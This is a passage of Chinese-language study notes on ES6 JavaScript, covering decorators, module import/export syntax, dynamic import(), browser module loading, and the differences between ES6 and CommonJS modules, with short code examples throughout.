'aliasFoo'}))\r\nclass MyClass { }\r\n\r\nlet obj = new MyClass();\r\nobj.foo() // foo\r\nobj.aliasFoo() // foo\r\nobj.bar() // bar\r\n\t- alias和excludes方法，可以结合起来使用。\r\n\t- @traits(TExample::excludes('foo','bar')::alias({baz:'exampleBaz'}))\r\nclass MyClass {}\r\n\r\n### Babel 转码器的支持\r\n\r\n- 目前，Babel 转码器已经支持 Decorator。\r\n\r\n\t- 首先，安装babel-core和babel-plugin-transform-decorators。由于后者包括在babel-preset-stage-0之中，所以改为安装babel-preset-stage-0亦可。\r\n\t- $ npm install babel-core babel-plugin-transform-decorators\r\n\t- 然后，设置配置文件.babelrc。\r\n\t- {\r\n  \"plugins\": [\"transform-decorators\"]\r\n}\r\n\t- 这时，Babel 就可以对 Decorator 转码了。\r\n\r\n## Module 的语法\r\n\r\n### 概述\r\n\r\n- 历史上，JavaScript 一直没有模块（module）体系，无法将一个大程序拆分成互相依赖的小文件，再用简单的方法拼装起来。其他语言都有这项功能，比如 Ruby 的require、Python 的import，甚至就连 CSS 都有@import，但是 JavaScript 任何这方面的支持都没有，这对开发大型的、复杂的项目形成了巨大障碍。\r\n\r\n在 ES6 之前，社区制定了一些模块加载方案，最主要的有 CommonJS 和 AMD 两种。前者用于服务器，后者用于浏览器。ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案。\r\n\r\nES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量。CommonJS 和 AMD 模块，都只能在运行时确定这些东西。比如，CommonJS 模块就是对象，输入时必须查找对象属性。\r\n- // CommonJS模块\r\nlet { stat, exists, readFile } = require('fs');\r\n\r\n// 等同于\r\nlet _fs = require('fs');\r\nlet stat = _fs.stat;\r\nlet exists = _fs.exists;\r\nlet readfile = _fs.readfile;\r\n- 上面代码的实质是整体加载fs模块（即加载fs的所有方法），生成一个对象（_fs），然后再从这个对象上面读取 3 个方法。这种加载称为“运行时加载”，因为只有运行时才能得到这个对象，导致完全没办法在编译时做“静态优化”。\r\n- ES6 模块不是对象，而是通过export命令显式指定输出的代码，再通过import命令输入。\r\n- // ES6模块\r\nimport { stat, exists, readFile } from 'fs';\r\n- 上面代码的实质是从fs模块加载 3 个方法，其他方法不加载。这种加载称为“编译时加载”或者静态加载，即 ES6 可以在编译时就完成模块加载，效率要比 CommonJS 模块的加载方式高。当然，这也导致了没法引用 ES6 模块本身，因为它不是对象。\r\n- 由于 ES6 模块是编译时加载，使得静态分析成为可能。有了它，就能进一步拓宽 JavaScript 的语法，比如引入宏（macro）和类型检验（type system）这些只能靠静态分析实现的功能。\r\n- 除了静态加载带来的各种好处，ES6 模块还有以下好处。\r\n\r\n\t- 不再需要UMD模块格式了，将来服务器和浏览器都会支持 ES6 模块格式。目前，通过各种工具库，其实已经做到了这一点。\r\n\t- 将来浏览器的新 API 就能用模块格式提供，不再必须做成全局变量或者navigator对象的属性。\r\n\t- 不再需要对象作为命名空间（比如Math对象），未来这些功能可以通过模块提供。\r\n\r\n### 严格模式\r\n\r\n- ES6 的模块自动采用严格模式，不管你有没有在模块头部加上\"use strict\";。\r\n- 严格模式主要有以下限制。\r\n\r\n\t- 变量必须声明后再使用\r\n\t- 函数的参数不能有同名属性，否则报错\r\n\t- 不能使用with语句\r\n\t- 不能对只读属性赋值，否则报错\r\n\t- 不能使用前缀 0 表示八进制数，否则报错\r\n\t- 不能删除不可删除的属性，否则报错\r\n\t- 不能删除变量delete prop，会报错，只能删除属性delete global[prop]\r\n\t- eval不会在它的外层作用域引入变量\r\n\t- eval和arguments不能被重新赋值\r\n\t- arguments不会自动反映函数参数的变化\r\n\t- 不能使用arguments.callee\r\n\t- 不能使用arguments.caller\r\n\t- 禁止this指向全局对象\r\n\t- 不能使用fn.caller和fn.arguments获取函数调用的堆栈\r\n\t- 增加了保留字（比如protected、static和interface）\r\n\r\n### export 命令\r\n\r\n- 模块功能主要由两个命令构成：export和import。export命令用于规定模块的对外接口，import命令用于输入其他模块提供的功能。\r\n- 一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。如果你希望外部能够读取模块内部的某个变量，就必须使用export关键字输出该变量。下面是一个 JS 文件，里面使用export命令输出变量。\r\n- // profile.js\r\nexport var firstName = 'Michael';\r\nexport var lastName = 'Jackson';\r\nexport var year = 1958;\r\n- 上面代码是profile.js文件，保存了用户信息。ES6 将其视为一个模块，里面用export命令对外部输出了三个变量。\r\n- export的写法，除了像上面这样，还有另外一种。\r\n- // profile.js\r\nvar firstName = 'Michael';\r\nvar lastName = 'Jackson';\r\nvar year = 1958;\r\n\r\nexport {firstName, lastName, year};\r\n- 上面代码在export命令后面，使用大括号指定所要输出的一组变量。它与前一种写法（直接放置在var语句前）是等价的，但是应该优先考虑使用这种写法。因为这样就可以在脚本尾部，一眼看清楚输出了哪些变量。\r\n- export命令除了输出变量，还可以输出函数或类（class）。\r\n\r\n\t- export function multiply(x, y) {\r\n  return x * y;\r\n};\r\n\t- 上面代码对外输出一个函数multiply。\r\n\r\n- 通常情况下，export输出的变量就是本来的名字，但是可以使用as关键字重命名。\r\n\r\n\t- function v1() { ... }\r\nfunction v2() { ... }\r\n\r\nexport {\r\n  v1 as streamV1,\r\n  v2 as streamV2,\r\n  v2 as streamLatestVersion\r\n};\r\n\t- 上面代码使用as关键字，重命名了函数v1和v2的对外接口。重命名后，v2可以用不同的名字输出两次。\r\n\r\n- 需要特别注意的是，export命令规定的是对外的接口，必须与模块内部的变量建立一一对应关系。\r\n\r\n\t- // 报错\r\nexport 1;\r\n\r\n// 报错\r\nvar m = 1;\r\nexport m;\r\n\t- 上面两种写法都会报错，因为没有提供对外的接口。第一种写法直接输出 1，第二种写法通过变量m，还是直接输出 1。1只是一个值，不是接口。正确的写法是下面这样。\r\n\t- // 写法一\r\nexport var m = 1;\r\n\r\n// 写法二\r\nvar m = 1;\r\nexport {m};\r\n\r\n// 写法三\r\nvar n = 1;\r\nexport {n as m};\r\n\t- 上面三种写法都是正确的，规定了对外的接口m。其他脚本可以通过这个接口，取到值1。它们的实质是，在接口名与模块内部变量之间，建立了一一对应的关系。\r\n\t- 同样的，function和class的输出，也必须遵守这样的写法。\r\n\t- // 报错\r\nfunction f() {}\r\nexport f;\r\n\r\n// 正确\r\nexport function f() {};\r\n\r\n// 正确\r\nfunction f() {}\r\nexport {f};\r\n\t- 另外，export语句输出的接口，与其对应的值是动态绑定关系，即通过该接口，可以取到模块内部实时的值。\r\n\t- export var foo = 'bar';\r\nsetTimeout(() => foo = 'baz', 500);\r\n\t- 这一点与 CommonJS 规范完全不同。CommonJS 模块输出的是值的缓存，不存在动态更新\r\n\t- 最后，export命令可以出现在模块的任何位置，只要处于模块顶层就可以。如果处于块级作用域内，就会报错，下一节的import命令也是如此。这是因为处于条件代码块之中，就没法做静态优化了，违背了 ES6 模块的设计初衷。\r\n\t- function foo() {\r\n  export default 'bar' // SyntaxError\r\n}\r\nfoo()\r\n\t- 上面代码中，export语句放在函数之中，结果报错。\r\n\r\n### import 命令\r\n\r\n- 使用export命令定义了模块的对外接口以后，其他 JS 文件就可以通过import命令加载这个模块。\r\n\r\n\t- // main.js\r\nimport {firstName, lastName, year} from './profile.js';\r\n\r\nfunction setName(element) {\r\n  element.textContent = firstName + ' ' + lastName;\r\n}\r\n\t- 上面代码的import命令，用于加载profile.js文件，并从中输入变量。import命令接受一对大括号，里面指定要从其他模块导入的变量名。大括号里面的变量名，必须与被导入模块（profile.js）对外接口的名称相同。\r\n\t- 如果想为输入的变量重新取一个名字，import命令要使用as关键字，将输入的变量重命名。\r\n\t- import { lastName as surname } from './profile.js';\r\n\t- import命令输入的变量都是只读的，因为它的本质是输入接口。也就是说，不允许在加载模块的脚本里面，改写接口。\r\n\t- import {a} from './xxx.js'\r\n\r\na = {}; // Syntax Error : 'a' is read-only;\r\n\t- 上面代码中，脚本加载了变量a，对其重新赋值就会报错，因为a是一个只读的接口。但是，如果a是一个对象，改写a的属性是允许的。\r\n\t- import {a} from './xxx.js'\r\n\r\na.foo = 'hello'; // 合法操作\r\n\t- 上面代码中，a的属性可以成功改写，并且其他模块也可以读到改写后的值。不过，这种写法很难查错，建议凡是输入的变量，都当作完全只读，轻易不要改变它的属性。\r\n\t- import后面的from指定模块文件的位置，可以是相对路径，也可以是绝对路径，.js后缀可以省略。如果只是模块名，不带有路径，那么必须有配置文件，告诉 JavaScript 引擎该模块的位置。\r\n\t- import {myMethod} from 'util';\r\n\t- 上面代码中，util是模块文件名，由于不带有路径，必须通过配置，告诉引擎怎么取到这个模块。\r\n\t- 注意，import命令具有提升效果，会提升到整个模块的头部，首先执行。\r\n\t- foo();\r\n\r\nimport { foo } from 'my_module';\r\n\t- 上面的代码不会报错，因为import的执行早于foo的调用。这种行为的本质是，import命令是编译阶段执行的，在代码运行之前。\r\n\t- 由于import是静态执行，所以不能使用表达式和变量，这些只有在运行时才能得到结果的语法结构。\r\n\t- // 报错\r\nimport { 'f' + 'oo' } from 'my_module';\r\n\r\n// 报错\r\nlet module = 'my_module';\r\nimport { foo } from module;\r\n\r\n// 报错\r\nif (x === 1) {\r\n  import { foo } from 'module1';\r\n} else {\r\n  import { foo } from 'module2';\r\n}\r\n\t- 上面三种写法都会报错，因为它们用到了表达式、变量和if结构。在静态分析阶段，这些语法都是没法得到值的。\r\n\r\n- 最后，import语句会执行所加载的模块，因此可以有下面的写法。\r\n\r\n\t- import 'lodash';\r\n\t- 上面代码仅仅执行lodash模块，但是不输入任何值。\r\n\t- 如果多次重复执行同一句import语句，那么只会执行一次，而不会执行多次。\r\n\t- import 'lodash';\r\nimport 'lodash';\r\n\t- 上面代码加载了两次lodash，但是只会执行一次。\r\n\t- import { foo } from 'my_module';\r\nimport { bar } from 'my_module';\r\n\r\n// 等同于\r\nimport { foo, bar } from 'my_module';\r\n\t- 上面代码中，虽然foo和bar在两个语句中加载，但是它们对应的是同一个my_module实例。也就是说，import语句是 Singleton 模式。\r\n\r\n目前阶段，通过 Babel 转码，CommonJS 模块的require命令和 ES6 模块的import命令，可以写在同一个模块里面，但是最好不要这样做。因为import在静态解析阶段执行，所以它是一个模块之中最早执行的。下面的代码可能不会得到预期结果。\r\n\r\n### 模块的整体加载\r\n\r\n- 除了指定加载某个输出值，还可以使用整体加载，即用星号（*）指定一个对象，所有输出值都加载在这个对象上面。\r\n\r\n\t- 下面是一个circle.js文件，它输出两个方法area和circumference。\r\n\r\n\t\t- // circle.js\r\n\r\nexport function area(radius) {\r\n  return Math.PI * radius * radius;\r\n}\r\n\r\nexport function circumference(radius) {\r\n  return 2 * Math.PI * radius;\r\n}\r\n\t\t- 现在，加载这个模块。\r\n\t\t- // main.js\r\n\r\nimport { area, circumference } from './circle';\r\n\r\nconsole.log('圆面积：' + area(4));\r\nconsole.log('圆周长：' + circumference(14));\r\n\t\t- 上面写法是逐一指定要加载的方法，整体加载的写法如下。\r\n\t\t- import * as circle from './circle';\r\n\r\nconsole.log('圆面积：' + circle.area(4));\r\nconsole.log('圆周长：' + circle.circumference(14));\r\n\t\t- 注意，模块整体加载所在的那个对象（上例是circle），应该是可以静态分析的，所以不允许运行时改变。下面的写法都是不允许的。\r\n\t\t- import * as circle from './circle';\r\n\r\n// 下面两行都是不允许的\r\ncircle.foo = 'hello';\r\ncircle.area = function () {};\r\n\r\n### export default 命令\r\n\r\n- 从前面的例子可以看出，使用import命令的时候，用户需要知道所要加载的变量名或函数名，否则无法加载。但是，用户肯定希望快速上手，未必愿意阅读文档，去了解模块有哪些属性和方法。\r\n为了给用户提供方便，让他们不用阅读文档就能加载模块，就要用到export default命令，为模块指定默认输出。\r\n- // export-default.js\r\nexport default function () {\r\n  console.log('foo');\r\n}\r\n- 上面代码是一个模块文件export-default.js，它的默认输出是一个函数。\r\n- 其他模块加载该模块时，import命令可以为该匿名函数指定任意名字。\r\n- // import-default.js\r\nimport customName from './export-default';\r\ncustomName(); // 'foo'\r\n- 上面代码的import命令，可以用任意名称指向export-default.js输出的方法，这时就不需要知道原模块输出的函数名。需要注意的是，这时import命令后面，不使用大括号。\r\n- export default命令用在非匿名函数前，也是可以的。\r\n\r\n\t- // export-default.js\r\nexport default function foo() {\r\n  console.log('foo');\r\n}\r\n\r\n// 或者写成\r\n\r\nfunction foo() {\r\n  console.log('foo');\r\n}\r\n\r\nexport default foo;\r\n\t- 上面代码中，foo函数的函数名foo，在模块外部是无效的。加载的时候，视同匿名函数加载。\r\n\r\n- 下面比较一下默认输出和正常输出。\r\n\r\n\t- // 第一组\r\nexport default function crc32() { // 输出\r\n  // ...\r\n}\r\n\r\nimport crc32 from 'crc32'; // 输入\r\n\r\n// 第二组\r\nexport function crc32() { // 输出\r\n  // ...\r\n};\r\n\r\nimport {crc32} from 'crc32'; // 输入\r\n\t- 上面代码的两组写法，第一组是使用export default时，对应的import语句不需要使用大括号；第二组是不使用export default时，对应的import语句需要使用大括号。\r\n\t- export default命令用于指定模块的默认输出。显然，一个模块只能有一个默认输出，因此export default命令只能使用一次。所以，import命令后面才不用加大括号，因为只可能唯一对应export default命令。\r\n\t- 本质上，export default就是输出一个叫做default的变量或方法，然后系统允许你为它取任意名字。所以，下面的写法是有效的。\r\n\t- // modules.js\r\nfunction add(x, y) {\r\n  return x * y;\r\n}\r\nexport {add as default};\r\n// 等同于\r\n// export default add;\r\n\r\n// app.js\r\nimport { default as foo } from 'modules';\r\n// 等同于\r\n// import foo from 'modules';\r\n\r\n### export 与 import 的复合写法\r\n\r\n- 如果在一个模块之中，先输入后输出同一个模块，import语句可以与export语句写在一起。\r\n\r\n\t- export { foo, bar } from 'my_module';\r\n\r\n// 可以简单理解为\r\nimport { foo, bar } from 'my_module';\r\nexport { foo, bar };\r\n\t- 上面代码中，export和import语句可以结合在一起，写成一行。但需要注意的是，写成一行以后，foo和bar实际上并没有被导入当前模块，只是相当于对外转发了这两个接口，导致当前模块不能直接使用foo和bar。\r\n\t- 模块的接口改名和整体输出，也可以采用这种写法。\r\n\r\n\t\t- // 接口改名\r\nexport { foo as myFoo } from 'my_module';\r\n\r\n// 整体输出\r\nexport * from 'my_module';\r\n\r\n\t- 默认接口的写法如下。\r\n\r\n\t\t- export { default } from 'foo';\r\n\r\n\t- 具名接口改为默认接口的写法如下。\r\n\r\n\t\t- export { es6 as default } from './someModule';\r\n\r\n// 等同于\r\nimport { es6 } from './someModule';\r\nexport default es6;\r\n\r\n\t- 同样地，默认接口也可以改名为具名接口。\r\n\r\n\t\t- export { default as es6 } from './someModule';\r\n\r\n\t- 下面三种import语句，没有对应的复合写法。\r\n\r\n\t\t- import * as someIdentifier from \"someModule\";\r\nimport someIdentifier from \"someModule\";\r\nimport someIdentifier, { namedIdentifier } from \"someModule\";\r\n\r\n\t\t- 为了做到形式的对称，现在有提案，提出补上这三种复合写法。\r\n\t\t- export * as someIdentifier from \"someModule\";\r\nexport someIdentifier from \"someModule\";\r\nexport someIdentifier, { namedIdentifier } from \"someModule\";\r\n\r\n### 模块的继承\r\n\r\n- 模块之间也可以继承。\r\n\r\n\t- 假设有一个circleplus模块，继承了circle模块。\r\n\r\n\t\t- // circleplus.js\r\n\r\nexport * from 'circle';\r\nexport var e = 2.71828182846;\r\nexport default function(x) {\r\n  return Math.exp(x);\r\n}\r\n\t\t- 上面代码中的export *，表示再输出circle模块的所有属性和方法。注意，export *命令会忽略circle模块的default方法。然后，上面代码又输出了自定义的e变量和默认方法。\r\n\r\n这时，也可以将circle的属性或方法，改名后再输出。\r\n\t\t- // circleplus.js\r\n\r\nexport { area as circleArea } from 'circle';\r\n\t\t- 上面代码表示，只输出circle模块的area方法，且将其改名为circleArea。\r\n\r\n加载上面模块的写法如下。\r\n\t\t- // main.js\r\n\r\nimport * as math from 'circleplus';\r\nimport exp from 'circleplus';\r\nconsole.log(exp(math.e));\r\n\r\n\t\t- 上面代码中的import exp表示，将circleplus模块的默认方法加载为exp方法。\r\n\r\n### 跨模块常量\r\n\r\n- 本书介绍const命令的时候说过，const声明的常量只在当前代码块有效。如果想设置跨模块的常量（即跨多个文件），或者说一个值要被多个模块共享，可以采用下面的写法。\r\n\r\n\t- // constants.js 模块\r\nexport const A = 1;\r\nexport const B = 3;\r\nexport const C = 4;\r\n\r\n// test1.js 模块\r\nimport * as constants from './constants';\r\nconsole.log(constants.A); // 1\r\nconsole.log(constants.B); // 3\r\n\r\n// test2.js 模块\r\nimport {A, B} from './constants';\r\nconsole.log(A); // 1\r\nconsole.log(B); // 3\r\n\r\n- 如果要使用的常量非常多，可以建一个专门的constants目录，将各种常量写在不同的文件里面，保存在该目录下。\r\n\r\n\t- // constants/db.js\r\nexport const db = {\r\n  url: 'http://my.couchdbserver.local:5984',\r\n  admin_username: 'admin',\r\n  admin_password: 'admin password'\r\n};\r\n\r\n// constants/user.js\r\nexport const users = ['root', 'admin', 'staff', 'ceo', 'chief', 'moderator'];\r\n\t- 然后，将这些文件输出的常量，合并在index.js里面。\r\n\t- // constants/index.js\r\nexport {db} from './db';\r\nexport {users} from './users';\r\n\t- 使用的时候，直接加载index.js就可以了。\r\n\t- // script.js\r\nimport {db, users} from './constants/index';\r\n\r\n### import()\r\n\r\n- 简介\r\n\r\n\t- 前面介绍过，import命令会被 JavaScript 引擎静态分析，先于模块内的其他语句执行（import命令叫做“连接” binding 其实更合适）。所以，下面的代码会报错。\r\n\r\n// 报错\r\nif (x === 2) {\r\n  import MyModual from './myModual';\r\n}\r\n上面代码中，引擎处理import语句是在编译时，这时不会去分析或执行if语句，所以import语句放在if代码块之中毫无意义，因此会报句法错误，而不是执行时错误。也就是说，import和export命令只能在模块的顶层，不能在代码块之中（比如，在if代码块之中，或在函数之中）。\r\n\r\n这样的设计，固然有利于编译器提高效率，但也导致无法在运行时加载模块。在语法上，条件加载就不可能实现。如果import命令要取代 Node 的require方法，这就形成了一个障碍。因为require是运行时加载模块，import命令无法取代require的动态加载功能。\r\n\r\nconst path = './' + fileName;\r\nconst myModual = require(path);\r\n上面的语句就是动态加载，require到底加载哪一个模块，只有运行时才知道。import命令做不到这一点。\r\n\t- 因此，有一个提案，建议引入import()函数，完成动态加载。\r\n\r\n\t\t- import(specifier)\r\n\t\t- 上面代码中，import函数的参数specifier，指定所要加载的模块的位置。import命令能够接受什么参数，import()函数就能接受什么参数，两者区别主要是后者为动态加载。\r\n\r\nimport()返回一个 Promise 对象。下面是一个例子。\r\n\t\t- const main = document.querySelector('main');\r\n\r\nimport(`./section-modules/${someVariable}.js`)\r\n  .then(module => {\r\n    module.loadPageInto(main);\r\n  })\r\n  .catch(err => {\r\n    main.textContent = err.message;\r\n  });\r\n\t\t- import()函数可以用在任何地方，不仅仅是模块，非模块的脚本也可以使用。它是运行时执行，也就是说，什么时候运行到这一句，就会加载指定的模块。另外，import()函数与所加载的模块没有静态连接关系，这点也是与import语句不相同。import()类似于 Node 的require方法，区别主要是前者是异步加载，后者是同步加载。\r\n\t\t- 适用场合\r\n\r\n\t\t\t- （1）按需加载。\r\n\r\n\t\t\t\t- import()可以在需要的时候，再加载某个模块。\r\n\r\n\t\t\t\t\t- button.addEventListener('click', event => {\r\n  import('./dialogBox.js')\r\n  .then(dialogBox => {\r\n    dialogBox.open();\r\n  })\r\n  .catch(error => {\r\n    /* Error handling */\r\n  })\r\n});\r\n\t\t\t\t\t- 上面代码中，import()方法放在click事件的监听函数之中，只有用户点击了按钮，才会加载这个模块\r\n\r\n\t\t\t- （2）条件加载\r\n\r\n\t\t\t\t- import()可以放在if代码块，根据不同的情况，加载不同的模块。\r\n\r\n\t\t\t\t\t- if (condition) {\r\n  import('moduleA').then(...);\r\n} else {\r\n  import('moduleB').then(...);\r\n}\r\n\t\t\t\t\t- 上面代码中，如果满足条件，就加载模块 A，否则加载模块 B。\r\n\r\n\t\t\t- 3）动态的模块路径\r\n\r\n\t\t\t\t- import()允许模块路径动态生成。\r\n\r\n\t\t\t\t\t- import(f())\r\n.then(...);\r\n\t\t\t\t\t- 上面代码中，根据函数f的返回结果，加载不同的模块。\r\n\r\n\t\t- 注意点\r\n\r\n\t\t\t- import()加载模块成功以后，这个模块会作为一个对象，当作then方法的参数。因此，可以使用对象解构赋值的语法，获取输出接口。\r\n\r\n\t\t\t\t- import('./myModule.js')\r\n.then(({export1, export2}) => {\r\n  // ...·\r\n});\r\n\t\t\t\t- 上面代码中，export1和export2都是myModule.js的输出接口，可以解构获得。\r\n\r\n\t\t\t- 如果模块有default输出接口，可以用参数直接获得。\r\n\r\n\t\t\t\t- import('./myModule.js')\r\n.then(myModule => {\r\n  console.log(myModule.default);\r\n});\r\n\t\t\t\t- 上面的代码也可以使用具名输入的形式。\r\n\t\t\t\t- import('./myModule.js')\r\n.then(({default: theDefault}) => {\r\n  console.log(theDefault);\r\n});\r\n\t\t\t\t- 如果想同时加载多个模块，可以采用下面的写法。\r\n\t\t\t\t- Promise.all([\r\n  import('./module1.js'),\r\n  import('./module2.js'),\r\n  import('./module3.js'),\r\n])\r\n.then(([module1, module2, module3]) => {\r\n   ···\r\n});\r\n\t\t\t\t- import()也可以用在 async 函数之中。\r\n\t\t\t\t- async function main() {\r\n  const myModule = await import('./myModule.js');\r\n  const {export1, export2} = await import('./myModule.js');\r\n  const [module1, module2, module3] =\r\n    await Promise.all([\r\n      import('./module1.js'),\r\n      import('./module2.js'),\r\n      import('./module3.js'),\r\n    ]);\r\n}\r\nmain();\r\n\r\n- 自由主题\r\n\r\n- 自由主题\r\n\r\n- 自由主题\r\n\r\n## Module 的加载实现\r\n\r\n### 浏览器加载\r\n\r\n- 传统方法 \r\n\r\n\t- HTML 网页中，浏览器通过script标签加载 JavaScript 脚本。\r\n\r\n\t\t- \x3c!-- 页面内嵌的脚本 --\x3e\r\n&lt;script type=\"application/javascript\">\r\n  // module code\r\n&lt;/script&amp;gt; 标签加载\r\n\r\n\x3c!-- 外部脚本 --\x3e\r\n&lt;script type=\"application/javascript\" src=\"path/to/myModule.js\">\r\n&lt;/script&amp;gt;\r\n\t\t- 上面代码中，由于浏览器脚本的默认语言是 JavaScript，因此type=\"application/javascript\"可以省略。\r\n\r\n\t\t\t- 默认情况下，浏览器是同步加载 JavaScript 脚本，即渲染引擎遇到&lt;script&gt;标签就会停下来，等到执行完脚本，再继续向下渲染。如果是外部脚本，还必须加入脚本下载的时间。\r\n\r\n如果脚本体积很大，下载和执行的时间就会很长，因此造成浏览器堵塞，用户会感觉到浏览器“卡死”了，没有任何响应。这显然是很不好的体验，所以浏览器允许脚本异步加载，下面就是两种异步加载的语法。\r\n\t\t\t- &lt;script src=\"path/to/myModule.js\" defer>&lt;/script&amp;gt;\r\n&lt;script src=\"path/to/myModule.js\" async>&lt;/script&amp;gt;\r\n\t\t\t- 上面代码中，&lt;script&gt;标签打开defer或async属性，脚本就会异步加载。渲染引擎遇到这一行命令，就会开始下载外部脚本，但不会等它下载和执行，而是直接执行后面的命令。\r\n\r\ndefer与async的区别是：defer要等到整个页面在内存中正常渲染结束（DOM 结构完全生成，以及其他脚本执行完成），才会执行；async一旦下载完，渲染引擎就会中断渲染，执行这个脚本以后，再继续渲染。一句话，defer是“渲染完再执行”，async是“下载完就执行”。另外，如果有多个defer脚本，会按照它们在页面出现的顺序加载，而多个async脚本是不能保证加载顺序的。\r\n\r\n- 加载规则\r\n\r\n\t- 浏览器加载 ES6 模块，也使用&lt;script&gt;标签，但是要加入type=\"module\"属性。\r\n\r\n\t\t- &lt;script type=\"module\" src=\"./foo.js\">&lt;/script&amp;gt;\r\n\t\t- 上面代码在网页中插入一个模块foo.js，由于type属性设为module，所以浏览器知道这是一个 ES6 模块\r\n\t\t- 浏览器对于带有type=\"module\"的&lt;script&gt;，都是异步加载，不会造成堵塞浏览器，即等到整个页面渲染完，再执行模块脚本，等同于打开了&lt;script&gt;标签的defer属性。\r\n\t\t- &lt;script type=\"module\" src=\"./foo.js\">&lt;/script&amp;gt;\r\n\x3c!-- 等同于 --\x3e\r\n&lt;script type=\"module\" src=\"./foo.js\" defer>&lt;/script&amp;gt;\r\n\t\t- 如果网页有多个&lt;script type=\"module\">，它们会按照在页面出现的顺序依次执行。\r\n\t\t- &lt;script&gt;标签的async属性也可以打开，这时只要加载完成，渲染引擎就会中断渲染立即执行。执行完成后，再恢复渲染。\r\n\t\t- &lt;script type=\"module\" src=\"./foo.js\" async>&lt;/script&amp;gt;\r\n\t\t- 一旦使用了async属性，&lt;script type=\"module\">就不会按照在页面出现的顺序执行，而是只要该模块加载完成，就执行该模块。\r\n\t\t- ES6 模块也允许内嵌在网页中，语法行为与加载外部脚本完全一致。\r\n\t\t- &lt;script type=\"module\">\r\n  import utils from \"./utils.js\";\r\n\r\n  // other code\r\n&lt;/script&amp;gt;\r\n\t\t- 对于外部的模块脚本（上例是foo.js），有几点需要注意。\r\n\r\n\t\t\t- 代码是在模块作用域之中运行，而不是在全局作用域运行。模块内部的顶层变量，外部不可见。\r\n\t\t\t- 模块脚本自动采用严格模式，不管有没有声明use strict。\r\n\t\t\t- 模块之中，可以使用import命令加载其他模块（.js后缀不可省略，需要提供绝对 URL 或相对 URL），也可以使用export命令输出对外接口。\r\n\t\t\t- 模块之中，顶层的this关键字返回undefined，而不是指向window。也就是说，在模块顶层使用this关键字，是无意义的。\r\n\t\t\t- 同一个模块如果加载多次，将只执行一次。\r\n\r\n\t\t- 下面是一个示例模块。\r\n\r\n\t\t\t- import utils from 'https://example.com/js/utils.js';\r\n\r\nconst x = 1;\r\n\r\nconsole.log(x === window.x); //false\r\nconsole.log(this === undefined); // true\r\n\t\t\t- 利用顶层的this等于undefined这个语法点，可以侦测当前代码是否在 ES6 模块之中。\r\n\t\t\t- const isNotModuleScript = this !== undefined;\r\n\r\n### ES6 模块与 CommonJS 模块的差异\r\n\r\n- ES6 模块与 CommonJS 模块有两个重大差异。\r\n\r\n\t- CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。\r\n\t- CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。\r\n\r\n- 第二个差异是因为 CommonJS 加载的是一个对象（即module.exports属性），该对象只有在脚本运行完才会生成。而 ES6 模块不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成。\r\n- 下面重点解释第一个差异。\r\n\r\n\t- CommonJS 模块输出的是值的拷贝，也就是说，一旦输出一个值，模块内部的变化就影响不到这个值。请看下面这个模块文件lib.js的例子。\r\n\r\n\t\t- // lib.js\r\nvar counter = 3;\r\nfunction incCounter() {\r\n  counter++;\r\n}\r\nmodule.exports = {\r\n  counter: counter,\r\n  incCounter: incCounter,\r\n};\r\n\t\t- 上面代码输出内部变量counter和改写这个变量的内部方法incCounter。然后，在main.js里面加载这个模块。\r\n\t\t- // main.js\r\nvar mod = require('./lib');\r\n\r\nconsole.log(mod.counter);  // 3\r\nmod.incCounter();\r\nconsole.log(mod.counter); // 3\r\n\t\t- 上面代码说明，lib.js模块加载以后，它的内部变化就影响不到输出的mod.counter了。这是因为mod.counter是一个原始类型的值，会被缓存。除非写成一个函数，才能得到内部变动后的值。\r\n\t\t- // lib.js\r\nvar counter = 3;\r\nfunction incCounter() {\r\n  counter++;\r\n}\r\nmodule.exports = {\r\n  get counter() {\r\n    return counter\r\n  },\r\n  incCounter: incCounter,\r\n};\r\n\t\t- 上面代码中，输出的counter属性实际上是一个取值器函数。现在再执行main.js，就可以正确读取内部变量counter的变动了。\r\n\t\t- $ node main.js\r\n3\r\n4\r\n\r\n\t- ES6 模块的运行机制与 CommonJS 不一样。JS 引擎对脚本静态分析的时候，遇到模块加载命令import，就会生成一个只读引用。等到脚本真正执行时，再根据这个只读引用，到被加载的那个模块里面去取值。换句话说，ES6 的import有点像 Unix 系统的“符号连接”，原始值变了，import加载的值也会跟着变。因此，ES6 模块是动态引用，并且不会缓存值，模块里面的变量绑定其所在的模块。\r\n\r\n\t\t- 还是举上面的例子。\r\n\r\n\t\t\t- // lib.js\r\nexport let counter = 3;\r\nexport function incCounter() {\r\n  counter++;\r\n}\r\n\r\n// main.js\r\nimport { counter, incCounter } from './lib';\r\nconsole.log(counter); // 3\r\nincCounter();\r\nconsole.log(counter); // 4\r\n\t\t\t- 上面代码说明，ES6 模块输入的变量counter是活的，完全反应其所在模块lib.js内部的变化。\r\n\r\n\t\t- 再举一个出现在export一节中的例子。\r\n\r\n\t\t\t- // m1.js\r\nexport var foo = 'bar';\r\nsetTimeout(() => foo = 'baz', 500);\r\n\r\n// m2.js\r\nimport {foo} from './m1.js';\r\nconsole.log(foo);\r\nsetTimeout(() => console.log(foo), 500);\r\n\t\t\t- 上面代码中，m1.js的变量foo，在刚加载时等于bar，过了 500 毫秒，又变为等于baz。\r\n\t\t\t- 让我们看看，m2.js能否正确读取这个变化。\r\n\t\t\t- $ babel-node m2.js\r\n\r\nbar\r\nbaz\r\n\t\t\t- 上面代码表明，ES6 模块不会缓存运行结果，而是动态地去被加载的模块取值，并且变量总是绑定其所在的模块。\r\n\r\n\t\t- 由于 ES6 输入的模块变量，只是一个“符号连接”，所以这个变量是只读的，对它进行重新赋值会报错。\r\n\r\n\t\t\t- // lib.js\r\nexport let obj = {};\r\n\r\n// main.js\r\nimport { obj } from './lib';\r\n\r\nobj.prop = 123; // OK\r\nobj = {}; // TypeError\r\n\t\t\t- 上面代码中，main.js从lib.js输入变量obj，可以对obj添加属性，但是重新赋值就会报错。因为变量obj指向的地址是只读的，不能重新赋值，这就好比main.js创造了一个名为obj的const变量。\r\n\t\t\t- 最后，export通过接口，输出的是同一个值。不同的脚本加载这个接口，得到的都是同样的实例。\r\n\t\t\t- // mod.js\r\nfunction C() {\r\n  this.sum = 0;\r\n  this.add = function () {\r\n    this.sum += 1;\r\n  